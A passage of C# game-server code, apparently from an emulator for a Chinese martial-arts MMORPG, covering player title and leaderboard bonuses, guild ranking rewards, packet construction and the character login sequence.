					称号药品类3.药品ID = 1008002376;
					药品新效果(1008002376, 1, 称号药品类3.时间, (uint)timeSpan2.TotalMinutes);
				}
				else
				{
					称号药品类3.药品ID = 1008002377;
					药品新效果(1008002377, 1, 称号药品类3.时间, (uint)timeSpan2.TotalMinutes);
				}
				称号药品.TryAdd(称号药品类3.药品ID, 称号药品类3);
				World.发送全服大武圣称号获得消息(base.UserName, base.Player_Zx);
			}
			Config.搜索开关 = packetReader.ReadInt8();
			Config.告白开关 = packetReader.ReadInt8();
			int 蔬菜武器开关 = Config.蔬菜武器开关;
			Config.蔬菜武器开关 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			Config.宠物经验 = packetReader.ReadInt8();
			更新人物数据(this);
			更新装备效果to(this, this);
			if (原著衣服 != Config.原著衣服 || 蔬菜武器开关 != Config.蔬菜武器开关 || 头发开关 != Config.头发开关 || 武勋开关 != Config.武勋开关)
			{
				更新武功和状态();
				更新广播人物数据();
				更新装备效果();
				更新气功();
			}
			服务器时间();
		}

		public void 加载门派成员()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT * FROM TBL_XWWL_GuildMember", "GameServer");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count != 0)
			{
				World.门派成员list.Clear();
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					门派成员 门派成员2 = new 门派成员
					{
						ID = (int)dBToDataTable.Rows[i]["ID"],
						NAME = dBToDataTable.Rows[i]["FLD_NAME"].ToString(),
						GNAME = dBToDataTable.Rows[i]["G_Name"].ToString()
					};
					World.门派成员list.TryAdd(门派成员2.ID, 门派成员2);
				}
			}
			dBToDataTable.Dispose();
		}

		public void 获取称号类型(int 物品id, int 开关)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(物品id);
			发包类.Write4(0);
			发包类.Write2(0);
			发包类.Write2(1);
			double num = Convert.ToDouble(DateTime.Now.AddDays(30.0).ToString("yyMMddHHmm"));
			double num2 = Convert.ToDouble(DateTime.Now.ToString("yyMMddHHmm"));
			if (物品id == 1008001584)
			{
				num = Convert.ToDouble(base.FLD_VIPTIM.ToString("yyMMddHHmm"));
			}
			if (开关 != 0)
			{
				发包类.Write4((uint)num);
			}
			else
			{
				发包类.Write4(0);
			}
			发包类.Write4(0);
			发包类.Write2(开关);
			发包类.Write2(0);
			if (开关 != 0)
			{
				发包类.Write4((uint)num2);
			}
			else
			{
				发包类.Write4(0);
			}
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 17153, base.人物全服ID);
			}
		}

		public void 更新荣誉(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			int num2 = BitConverter.ToInt32(封包数据, 10);
			if (num2 == 3)
			{
				加载门派成员();
				switch (num)
				{
				case 1008001322:
					foreach (门派成员 value in World.门派成员list.Values)
					{
						Players players3 = 得到人物数据(value.NAME);
						if (players3 != null)
						{
							players3.门派称号类型 = 6101;
							players3.获取称号类型(1008001322, 1);
							players3.更新人物数据(players3);
							players3.更新广播人物数据();
						}
					}
					return;
				case 1008001323:
					foreach (门派成员 value2 in World.门派成员list.Values)
					{
						Players players2 = 得到人物数据(value2.NAME);
						if (players2 != null)
						{
							players2.门派称号类型 = 6001;
							players2.获取称号类型(1008001323, 1);
							players2.更新人物数据(players2);
							players2.更新广播人物数据();
						}
					}
					return;
				case 1008001324:
					foreach (门派成员 value3 in World.门派成员list.Values)
					{
						Players players = 得到人物数据(value3.NAME);
						if (players != null)
						{
							players.门派称号类型 = 5901;
							players.获取称号类型(1008001324, 1);
							players.更新人物数据(players);
							players.更新广播人物数据();
						}
					}
					return;
				}
				foreach (门派成员 value4 in World.门派成员list.Values)
				{
					Players players4 = 得到人物数据(value4.NAME);
					if (players4 != null)
					{
						players4.门派称号类型 = 0;
						players4.更新人物数据(players4);
						players4.更新广播人物数据();
					}
				}
				return;
			}
			int num3 = 1008001049;
			int num4 = 1008001049;
			int num5 = 1008001099;
			int num6 = 1008001099;
			if (num.ToString().Contains("100800120"))
			{
				num6 = 1008001199;
			}
			else if (num.ToString().Contains("100800121"))
			{
				num6 = 1008001209;
			}
			else if (num.ToString().Contains("100800122"))
			{
				num6 = 1008001219;
			}
			else if (num.ToString().Contains("100800123"))
			{
				num6 = 1008001229;
			}
			else if (num.ToString().Contains("100800124"))
			{
				num6 = 1008001239;
			}
			if (num.ToString().Contains("100800125"))
			{
				num4 = 1008001239;
			}
			else if (num.ToString().Contains("100800126"))
			{
				num4 = 1008001249;
			}
			else if (num.ToString().Contains("100800127"))
			{
				num4 = 1008001259;
			}
			else if (num.ToString().Contains("100800128"))
			{
				num4 = 1008001269;
			}
			else if (num.ToString().Contains("100800129"))
			{
				num4 = 1008001279;
			}
			if (!num.ToString().Contains("100800120") && !num.ToString().Contains("100800121") && !num.ToString().Contains("100800122") && !num.ToString().Contains("100800123") && !num.ToString().Contains("100800124"))
			{
				if (!num.ToString().Contains("100800125") && !num.ToString().Contains("100800126") && !num.ToString().Contains("100800127") && !num.ToString().Contains("100800128") && !num.ToString().Contains("100800129"))
				{
					switch (num)
					{
					default:
						base.FLD_荣誉ID = 0;
						称号排名 = 0;
						break;
					case 1008001567:
						base.FLD_荣誉ID = 601;
						break;
					case 1008001568:
						base.FLD_荣誉ID = 602;
						break;
					case 1008001569:
						base.FLD_荣誉ID = 603;
						break;
					case 1008001570:
						base.FLD_荣誉ID = 604;
						break;
					case 1008001571:
						base.FLD_荣誉ID = 605;
						break;
					case 1008001395:
						base.FLD_荣誉ID = 461;
						break;
					case 1008001396:
						base.FLD_荣誉ID = 462;
						break;
					case 1008001397:
						base.FLD_荣誉ID = 463;
						break;
					case 1008001398:
						base.FLD_荣誉ID = 464;
						break;
					case 1008001399:
						base.FLD_荣誉ID = 465;
						break;
					}
				}
				else
				{
					base.FLD_荣誉ID = num - num3;
					称号排名 = num - num4;
				}
			}
			else
			{
				base.FLD_荣誉ID = num - num5;
				称号排名 = num - num6;
			}
			更新人物数据(this);
			更新广播人物数据();
			更新HP_MP_SP();
			更新武功和状态();
		}

		public void 发送已完成任务数据()
		{
			byte[] array = Converter.hexStringToByte("AA55E2072D018B00D407E8030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			int num = 0;
			foreach (int value in 已完成任务.Values)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 10 + num * 2, 2);
				num++;
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 新系统提示(int ID1, int ID2, string 名字1, string 名字2)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(ID1);
			发包类.Write4(ID2);
			发包类.WriteName(名字1);
			发包类.Write4(0);
			发包类.Write2(0);
			发包类.WriteName("");
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 45080, base.人物全服ID);
			}
		}

		public void 门派荣誉称号()
		{
			if (World.门派排名数据.Count == 0)
			{
				return;
			}
			for (int i = 0; i < World.门派排名数据.Count; i++)
			{
				if (i == 0 && World.门派排名数据[i] != null && World.门派排名数据[i].门派帮派名 == base.帮派名字)
				{
					if (base.帮派人物等级 == 6)
					{
						foreach (Players value in World.AllConnectedPlayers.Values)
						{
							value.新系统提示(1, 4582, base.UserName, base.UserName);
						}
						新系统提示(3, 4582, base.UserName, base.UserName);
					}
					获取称号类型(1008001322, 1);
					获取称号类型(1008001323, 0);
					获取称号类型(1008001324, 0);
					门派称号类型 = 6101;
					base.门派称号追加攻击 = int.Parse(World.门派第一称号奖励[0]);
					base.门派称号追加防御 = int.Parse(World.门派第一称号奖励[1]);
					base.门派称号追加HP = int.Parse(World.门派第一称号奖励[2]);
					系统提示("奖励攻击" + int.Parse(World.门派第一称号奖励[0]) + ", 防御" + int.Parse(World.门派第一称号奖励[1]) + ", 血" + int.Parse(World.门派第一称号奖励[2]), 9, "门派称号BUFF");
				}
				if (i == 1 && World.门派排名数据[i] != null && World.门派排名数据[i].门派帮派名 == base.帮派名字)
				{
					if (base.帮派人物等级 == 6)
					{
						foreach (Players value2 in World.AllConnectedPlayers.Values)
						{
							value2.新系统提示(1, 4583, base.UserName, base.UserName);
						}
						新系统提示(3, 4583, base.UserName, base.UserName);
					}
					获取称号类型(1008001322, 0);
					获取称号类型(1008001323, 1);
					获取称号类型(1008001324, 0);
					门派称号类型 = 6001;
					base.门派称号追加攻击 = int.Parse(World.门派第二称号奖励[0]);
					base.门派称号追加防御 = int.Parse(World.门派第二称号奖励[1]);
					base.门派称号追加HP = int.Parse(World.门派第二称号奖励[2]);
					系统提示("奖励攻击" + int.Parse(World.门派第二称号奖励[0]) + ", 防御" + int.Parse(World.门派第二称号奖励[1]) + ", 血" + int.Parse(World.门派第二称号奖励[2]), 9, "门派称号BUFF");
				}
				if (i != 2 || World.门派排名数据[i] == null || !(World.门派排名数据[i].门派帮派名 == base.帮派名字))
				{
					continue;
				}
				if (base.帮派人物等级 == 6)
				{
					foreach (Players value3 in World.AllConnectedPlayers.Values)
					{
						value3.新系统提示(1, 4584, base.UserName, base.UserName);
					}
					新系统提示(3, 4584, base.UserName, base.UserName);
				}
				获取称号类型(1008001322, 0);
				获取称号类型(1008001323, 0);
				获取称号类型(1008001324, 1);
				门派称号类型 = 5901;
				base.门派称号追加攻击 = int.Parse(World.门派第三称号奖励[0]);
				base.门派称号追加防御 = int.Parse(World.门派第三称号奖励[1]);
				base.门派称号追加HP = int.Parse(World.门派第三称号奖励[2]);
				系统提示("奖励攻击" + int.Parse(World.门派第三称号奖励[0]) + ", 防御" + int.Parse(World.门派第三称号奖励[1]) + ", 血" + int.Parse(World.门派第三称号奖励[2]), 9, "门派称号BUFF");
			}
		}

		public void 获得玫瑰称号属性()
		{
			if (玫瑰称号积分 >= int.Parse(World.玫瑰第一名奖励[0]))
			{
				base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第一名奖励[1]);
				base.玫瑰称号追加防御 = int.Parse(World.玫瑰第一名奖励[2]);
				base.玫瑰称号追加HP = int.Parse(World.玫瑰第一名奖励[3]);
				base.玫瑰追加战斗力 = int.Parse(World.玫瑰第一名奖励[4]);
				base.FLD_荣誉ID = 461;
				获取称号类型(1008001395, 1);
			}
			else if (玫瑰称号积分 >= int.Parse(World.玫瑰第二名奖励[0]))
			{
				base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第二名奖励[1]);
				base.玫瑰称号追加防御 = int.Parse(World.玫瑰第二名奖励[2]);
				base.玫瑰称号追加HP = int.Parse(World.玫瑰第二名奖励[3]);
				base.玫瑰追加战斗力 = int.Parse(World.玫瑰第二名奖励[4]);
				base.FLD_荣誉ID = 462;
				获取称号类型(1008001396, 1);
			}
			else if (玫瑰称号积分 >= int.Parse(World.玫瑰第三名奖励[0]))
			{
				base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第三名奖励[1]);
				base.玫瑰称号追加防御 = int.Parse(World.玫瑰第三名奖励[2]);
				base.玫瑰称号追加HP = int.Parse(World.玫瑰第三名奖励[3]);
				base.玫瑰追加战斗力 = int.Parse(World.玫瑰第三名奖励[4]);
				base.FLD_荣誉ID = 463;
				获取称号类型(1008001397, 1);
			}
			else if (玫瑰称号积分 >= int.Parse(World.玫瑰第四名奖励[0]))
			{
				base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第四名奖励[1]);
				base.玫瑰称号追加防御 = int.Parse(World.玫瑰第四名奖励[2]);
				base.玫瑰称号追加HP = int.Parse(World.玫瑰第四名奖励[3]);
				base.玫瑰追加战斗力 = int.Parse(World.玫瑰第四名奖励[4]);
				base.FLD_荣誉ID = 464;
				获取称号类型(1008001398, 1);
			}
			else if (玫瑰称号积分 >= int.Parse(World.玫瑰第五名奖励[0]))
			{
				base.玫瑰称号追加攻击 = int.Parse(World.玫瑰第五名奖励[1]);
				base.玫瑰称号追加防御 = int.Parse(World.玫瑰第五名奖励[2]);
				base.玫瑰称号追加HP = int.Parse(World.玫瑰第五名奖励[3]);
				base.玫瑰追加战斗力 = int.Parse(World.玫瑰第五名奖励[4]);
				base.FLD_荣誉ID = 465;
				获取称号类型(1008001399, 1);
			}
		}

		public void 获得花榜称号属性()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("SELECT  top  5  *  FROM  TBL_XWWL_RoseTop  where  FLD_SEX  =  {0}  and  FLD_ZX={1} and  FLD_FQ= '" + World.ZoneNumber + "' Order  By  FLD_INNUM  Desc", base.Player_Sex, base.Player_Zx));
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count > 0)
			{
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					if (dBToDataTable.Rows[i]["FLD_NAME"].ToString() == base.UserName)
					{
						switch (i)
						{
						case 0:
							base.花榜追加攻击 = int.Parse(World.花榜第一名奖励[1]);
							base.花榜追加防御 = int.Parse(World.花榜第一名奖励[2]);
							base.花榜追加HP = int.Parse(World.花榜第一名奖励[3]);
							获取称号类型(1008001310, 1);
							break;
						case 1:
							base.花榜追加攻击 = int.Parse(World.花榜第二名奖励[1]);
							base.花榜追加防御 = int.Parse(World.花榜第二名奖励[2]);
							base.花榜追加HP = int.Parse(World.花榜第二名奖励[3]);
							获取称号类型(1008001311, 1);
							break;
						case 2:
							base.花榜追加攻击 = int.Parse(World.花榜第三名奖励[1]);
							base.花榜追加防御 = int.Parse(World.花榜第三名奖励[2]);
							base.花榜追加HP = int.Parse(World.花榜第三名奖励[3]);
							获取称号类型(1008001312, 1);
							break;
						case 3:
							base.花榜追加攻击 = int.Parse(World.花榜第四名奖励[1]);
							base.花榜追加防御 = int.Parse(World.花榜第四名奖励[2]);
							base.花榜追加HP = int.Parse(World.花榜第四名奖励[3]);
							获取称号类型(1008001313, 1);
							break;
						case 4:
							base.花榜追加攻击 = int.Parse(World.花榜第五名奖励[1]);
							base.花榜追加防御 = int.Parse(World.花榜第五名奖励[2]);
							base.花榜追加HP = int.Parse(World.花榜第五名奖励[3]);
							获取称号类型(1008001314, 1);
							break;
						}
					}
				}
			}
			dBToDataTable.Dispose();
		}

		public void 武林前十称号属性()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT  top  10  *  FROM  TBL_荣誉系统  where  FLD_类型  =  2  and FLD_帮派门主='" + World.ZoneNumber + "' Order  By  FLD_分数  Desc");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count > 0)
			{
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					if (dBToDataTable.Rows[i]["FLD_人物名"].ToString() == base.UserName)
					{
						switch (i)
						{
						case 0:
							base.前十追加攻击 = int.Parse(World.前十第一名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第一名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第一名奖励[3]);
							break;
						case 1:
							base.前十追加攻击 = int.Parse(World.前十第二名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第二名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第二名奖励[3]);
							break;
						case 2:
							base.前十追加攻击 = int.Parse(World.前十第三名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第三名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第三名奖励[3]);
							break;
						case 3:
							base.前十追加攻击 = int.Parse(World.前十第四名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第四名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第四名奖励[3]);
							break;
						case 4:
							base.前十追加攻击 = int.Parse(World.前十第五名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第五名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第五名奖励[3]);
							break;
						case 5:
							base.前十追加攻击 = int.Parse(World.前十第六名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第六名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第六名奖励[3]);
							break;
						case 6:
							base.前十追加攻击 = int.Parse(World.前十第七名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第七名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第七名奖励[3]);
							break;
						case 7:
							base.前十追加攻击 = int.Parse(World.前十第八名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第八名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第八名奖励[3]);
							break;
						case 8:
							base.前十追加攻击 = int.Parse(World.前十第九名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第九名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第九名奖励[3]);
							break;
						case 9:
							base.前十追加攻击 = int.Parse(World.前十第十名奖励[1]);
							base.前十追加防御 = int.Parse(World.前十第十名奖励[2]);
							base.前十追加HP = int.Parse(World.前十第十名奖励[3]);
							break;
						}
					}
				}
			}
			dBToDataTable.Dispose();
		}

		public void 获得排位榜称号属性()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT  top  10  *  FROM  luandouTop Order  By  击杀  Desc");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count > 0)
			{
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					if (dBToDataTable.Rows[i]["人物名"].ToString() == base.UserName)
					{
						switch (i)
						{
						case 0:
							base.乱斗追加攻击 = int.Parse(World.排位榜第一名奖励[0]);
							base.乱斗追加防御 = int.Parse(World.排位榜第一名奖励[1]);
							base.乱斗追加HP = int.Parse(World.排位榜第一名奖励[2]);
							获取称号类型(1008001315, 1);
							系统提示("攻击" + int.Parse(World.排位榜第一名奖励[0]) + "丨防御" + int.Parse(World.排位榜第一名奖励[1]) + "丨血量" + int.Parse(World.排位榜第一名奖励[2]), 21, "乱斗榜第一名加成");
							break;
						case 1:
							base.乱斗追加攻击 = int.Parse(World.排位榜第二名奖励[0]);
							base.乱斗追加防御 = int.Parse(World.排位榜第二名奖励[1]);
							base.乱斗追加HP = int.Parse(World.排位榜第二名奖励[2]);
							获取称号类型(1008001316, 1);
							系统提示("攻击" + int.Parse(World.排位榜第二名奖励[0]) + "丨防御" + int.Parse(World.排位榜第二名奖励[1]) + "丨血量" + int.Parse(World.排位榜第二名奖励[2]), 21, "乱斗榜第二名加成");
							break;
						case 2:
							base.乱斗追加攻击 = int.Parse(World.排位榜第三名奖励[0]);
							base.乱斗追加防御 = int.Parse(World.排位榜第三名奖励[1]);
							base.乱斗追加HP = int.Parse(World.排位榜第三名奖励[2]);
							获取称号类型(1008001317, 1);
							系统提示("攻击" + int.Parse(World.排位榜第三名奖励[0]) + "丨防御" + int.Parse(World.排位榜第三名奖励[1]) + "丨血量" + int.Parse(World.排位榜第三名奖励[2]), 21, "乱斗榜第三名加成");
							break;
						case 3:
							base.乱斗追加攻击 = int.Parse(World.排位榜第四名奖励[0]);
							base.乱斗追加防御 = int.Parse(World.排位榜第四名奖励[1]);
							base.乱斗追加HP = int.Parse(World.排位榜第四名奖励[2]);
							获取称号类型(1008001318, 1);
							系统提示("攻击" + int.Parse(World.排位榜第四名奖励[0]) + "丨防御" + int.Parse(World.排位榜第四名奖励[1]) + "丨血量" + int.Parse(World.排位榜第四名奖励[2]), 21, "乱斗榜第四名加成");
							break;
						case 4:
							base.乱斗追加攻击 = int.Parse(World.排位榜第五名奖励[0]);
							base.乱斗追加防御 = int.Parse(World.排位榜第五名奖励[1]);
							base.乱斗追加HP = int.Parse(World.排位榜第五名奖励[2]);
							获取称号类型(1008001319, 1);
							系统提示("攻击" + int.Parse(World.排位榜第五名奖励[0]) + "丨防御" + int.Parse(World.排位榜第五名奖励[1]) + "丨血量" + int.Parse(World.排位榜第五名奖励[2]), 21, "乱斗榜第五名加成");
							break;
						}
					}
				}
			}
			dBToDataTable.Dispose();
		}

		public void 人物登陆(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int num = 0;
			if (base.Client != null && !base.Client.登陆)
			{
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				return;
			}
			try
			{
				if (World.AllConnectedPlayers.TryGetValue(base.人物全服ID, out var _))
				{
					封号(720, base.Userid, "非法修改封包封号_人物登陆1");
					return;
				}
				if (人物是否登陆)
				{
					封号(720, base.Userid, "非法修改封包封号_人物登陆2");
					return;
				}
				人物是否登陆 = true;
				num = 1;
				if (!allChars.TryGetValue(封包数据[10], out var value2))
				{
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
					return;
				}
				num = 2;
				base.UserName = value2;
				if (base.UserName.Length == 0)
				{
					base.Client.Dispose();
				}
				if (base.UserName.Length > 14)
				{
					MainForm.WriteLine(99, "非法人物名[" + base.Userid + "][" + base.UserName + "] [" + base.Client.ToString() + "]");
					base.Client.Dispose();
				}
				num = 3;
				读出人物数据();
				门派荣誉称号();
				获得花榜称号属性();
				获得玫瑰称号属性();
				武林前十称号属性();
				获得排位榜称号属性();
				if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
					base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
					base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.至高无上称号奖励[4]);
					base.FLD_荣誉ID = 601;
					获取称号类型(1008001567, 1);
				}
				else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
					base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
					base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.举世无双称号奖励[4]);
					base.FLD_荣誉ID = 602;
					获取称号类型(1008001568, 1);
				}
				else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
					base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
					base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.雄霸天下称号奖励[4]);
					base.FLD_荣誉ID = 603;
					获取称号类型(1008001569, 1);
				}
				else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
					base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
					base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.孤胆英雄称号奖励[4]);
					base.FLD_荣誉ID = 604;
					获取称号类型(1008001570, 1);
				}
				else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
				{
					base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
					base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
					base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
					base.称号追加战斗力 = int.Parse(World.英雄豪杰称号奖励[4]);
					base.FLD_荣誉ID = 605;
					获取称号类型(1008001571, 1);
				}
				num = 8;
				num = 7;
				服务器时间();
				num = 11;
				检测走跑();
				num = 12;
				初始化气功();
				num = 13;
				初始化装备篮包裹();
				num = 130;
				初始化凝神珠包裹();
				num = 1300;
				if (是否携带披风行囊)
				{
					初始化披风行囊();
				}
				num = 64;
				初始化行囊包裹();
				num = 65;
				初始化杂货行囊包裹();
				num = 14;
				发送任务物品列表();
				num = 15;
				初始化已装备物品();
				num = 16;
				num = 17;
				Set个人药品();
				num = 18;
				更新金钱和负重();
				num = 19;
				灵兽数();
				num = 20;
				set特殊物品();
				num = 23;
				set公有物品();
				set时间物品();
				set称号物品();
				if (base.Player_WuXun < 0)
				{
					base.Player_WuXun = 0;
				}
				num = 24;
				Set追加状态物品();
				num = 25;
				计算人物装备数据();
				num = 26;
				num = 28;
				更新人物任务2(0);
				num = 29;
				发送已完成任务数据();
				num = 290;
				发送土灵符数据();
				num = 30;
				if (Logoin())
				{
					上线 = true;
					num = 31;
					更新制作系统();
					num = 32;
					num = 33;
					获取复查范围Npc();
					num = 34;
					获取复查范围玩家();
					num = 35;
					获取复查范围地面物品();
					num = 36;
					if (base.帮派Id != 0)
					{
						查帮派();
					}
					num = 49;
					if (是否有未读传书(this))
					{
						RxjhClass.上线删除传书已读(base.UserName, 0);
					}
					num = 37;
					初始化职业技能();
					num = 47;
					if (师傅数据.TID != -1)
					{
						徒弟更新师徒系统();
					}
					else
					{
						for (int i = 0; i < 3; i++)
						{
							if (徒弟数据[i].TID != -1)
							{
								师傅更新师徒系统(i);
							}
							计算师徒属性(i);
						}
					}
					更新荣誉();
					num = 48;
					进入游戏发送传书(string.Format(World.进入传书内容, base.UserName), base.UserName, World.进入传书发送人);
					有新传书提示(2, 0);
					num = 54;
					结婚BUFF();
					num = 55;
					横幅公告(World.进入公告);
					num = 56;
					更新移动速度();
					num = 50;
					其他();
					num = 51;
					更新人物数据(this);
					num = 52;
					更新武功和状态();
					num = 53;
					更新HP_MP_SP();
					num = 54;
					新手上线();
					num = 71;
					更新经验和历练();
					num = 72;
					SerList.Clear();
					Connect conn = World.conn;
					string msg = "获取服务器列表|" + base.Userid + "|" + base.原服务器序号 + "|" + base.原服务器IP + "|" + base.原服务器端口 + "|" + base.原服务器ID;
					conn.发送(msg);
					num = 73;
					检测婚姻状态();
					num = 74;
					更新武功冷却();
					num = 75;
					加载攻城数据();
					人物是否登陆 = true;
					判断是否用封包登陆 = 1;
					加载门战数据();
					if (World.是否开启上线BUFF == 1 && !追加状态列表.ContainsKey(1008000387))
					{
						追加状态类 追加状态类2 = new 追加状态类(this, 864000000.0, 1008000387.0, 1.0);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						状态效果(BitConverter.GetBytes(1008000387), 1, 864000000);
						base.FLD_人物_追加_经验百分比 += 0.5;
						更新HP_MP_SP();
						更新武功和状态();
						更新气功();
					}
					foreach (GuildWarData value3 in World.guildWarDataList.Values)
					{
						if (value3.LeaderName == base.UserName && DateTime.Now < value3.RewardTime)
						{
							if (!追加状态列表.ContainsKey(900000047))
							{
								long ticks = value3.RewardTime.ToUniversalTime().Ticks;
								long ticks2 = DateTime.Now.ToUniversalTime().Ticks;
								long num2 = (ticks - ticks2) / 10000;
								追加状态类 追加状态类3 = new 追加状态类(this, num2, 900000047.0, 1.0);
								追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
								状态效果(BitConverter.GetBytes(900000047), 1, (int)num2);
								base.FLD_人物_追加_攻击 += 100;
								base.FLD_人物_追加_防御 += 100;
								base.人物追加最大_HP += 500;
								base.FLD_人物_追加_气功++;
								更新HP_MP_SP();
								更新武功和状态();
								更新气功();
							}
							系统提示("你的门战门主奖励到期时间是:" + value3.RewardTime.ToString("yyyy年MM月dd日hh时mm分"), 9, "系统提示");
						}
						else if (value3.GuildName == base.帮派名字 && DateTime.Now < value3.RewardTime)
						{
							if (!追加状态列表.ContainsKey(900000046))
							{
								long ticks3 = value3.RewardTime.ToUniversalTime().Ticks;
								long ticks4 = DateTime.Now.ToUniversalTime().Ticks;
